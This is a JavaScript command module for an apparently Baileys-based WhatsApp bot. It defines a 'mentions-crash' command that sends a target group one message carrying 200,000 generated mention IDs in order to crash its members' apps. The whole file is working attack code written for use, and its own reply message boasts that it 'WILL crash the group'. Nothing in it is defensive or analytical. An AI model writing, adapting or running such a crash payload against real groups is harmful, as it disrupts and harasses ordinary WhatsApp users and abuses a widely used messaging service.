export default {
  name: "mentions-crash",
  description: "Send massive mentions JSON crash (Group only)",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?mentions-crash <group>\n\nExample:\n?mentions-crash 120XXXXXXX@g.us\n\n⚠️ This command only works in groups!`
        });
      }

      // Check if target is a group
      if (!target.includes("@g.us")) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: "⚠️ Mentions crash only works in groups. Please provide a group ID ending with @g.us"
        });
      }

      console.log(`[INFO] Executing mentions-crash on target: ${target}`);

      // Generate massive mentions array
      const PREFIX = "23491";
      const UNIQUE_COUNT = 2000;
      const TOTAL_COUNT = 200_000;
      
      const base = [];
      for(let i = 0; i < UNIQUE_COUNT; i++) {
        base.push(PREFIX + String(1000000 + i).slice(-7) + "@s.whatsapp.net");
      }
      
      const mentions = [];
      while(mentions.length < TOTAL_COUNT) {
        mentions.push(...base);
      }
      mentions.length = TOTAL_COUNT;

      // Send the mentions crash
      await sock.sendMessage(target, { 
        text: "💀 Mentions Crash 💀", 
        mentions: mentions 
      });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `💀 Mentions crash sent to ${target}!\n📊 Mentions count: ${mentions.length}\n⚠️ WARNING: This WILL crash the group!`
      });

    } catch (error) {
      console.error(`[ERROR] Mentions-crash command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send mentions crash: " + error.message
      });
    }
  }
};